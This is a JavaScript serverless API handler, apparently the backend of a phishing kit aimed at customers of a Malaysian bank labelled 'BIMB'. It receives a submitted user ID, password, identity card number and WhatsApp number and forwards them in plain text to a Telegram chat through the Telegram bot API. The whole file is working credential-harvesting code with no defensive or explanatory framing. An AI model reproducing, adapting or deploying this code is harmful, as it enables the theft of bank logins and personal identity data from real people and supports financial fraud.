export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { username, password, icnumber, whatsapp } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: 'Missing required fields' });
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  const message = `
[BIMB Submission]
UserID: ${username}
Password: ${password}
${icnumber ? `IC Number: ${icnumber}` : ''}
${whatsapp ? `WhatsApp: ${whatsapp}` : ''}
  `;

  try {
    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    const result = await telegramResponse.json();

    if (!result.ok) {
      throw new Error(result.description);
    }

    return res.status(200).json({ message: 'Success' });
  } catch (error) {
    console.error('Telegram Error:', error);
    return res.status(500).json({ error: 'Failed to send to Telegram' });
  }
  }
